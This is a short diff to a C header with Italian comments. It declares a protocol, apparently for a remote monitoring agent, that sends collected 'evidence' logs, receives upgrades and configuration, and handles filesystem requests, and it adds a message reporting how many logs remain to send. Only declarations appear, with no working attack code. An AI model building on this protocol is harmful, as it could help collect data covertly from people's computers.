@@ -15,6 +15,7 @@ extern BOOL ASP_GetDownload(DWORD *, WCHAR ***);
 extern BOOL ASP_SendLog(char *, DWORD);
 extern BOOL ASP_ReceiveConf(char *);
 extern BOOL ASP_GetFileSystem(DWORD *, fs_browse_elem **);
+extern BOOL ASP_SendStatus(UINT64 log_count, UINT64 log_size);
 
 // Valori di ritorno della funzione ASP_Poll()
 #define ASP_POLL_FETCHING 0
@@ -35,6 +36,7 @@ extern BOOL ASP_GetFileSystem(DWORD *, fs_browse_elem **);
 #define PROTO_LOG               (UINT)0x09      // Spedisce un evidence
 #define PROTO_UPGRADE           (UINT)0x16      // Riceve un upgrade
 #define PROTO_FILESYSTEM        (UINT)0x19      // Riceve le richieste relative al filesystem
+#define PROTO_LOGSTATUS         (UINT)0x0b      // Invia il numero e la size dei log da spedire
 
 // Strutture inviate o ritornate via IPC al core
 typedef struct {
@@ -63,6 +65,11 @@ typedef struct {
 	WCHAR file_name[MAX_PATH];
 	DWORD byte_per_second;
 } asp_request_log;
+
+typedef struct {
+	UINT64 log_count;
+	UINT64 log_size;
+} asp_request_stat;
 
 typedef struct {
 	WCHAR conf_path[MAX_PATH];
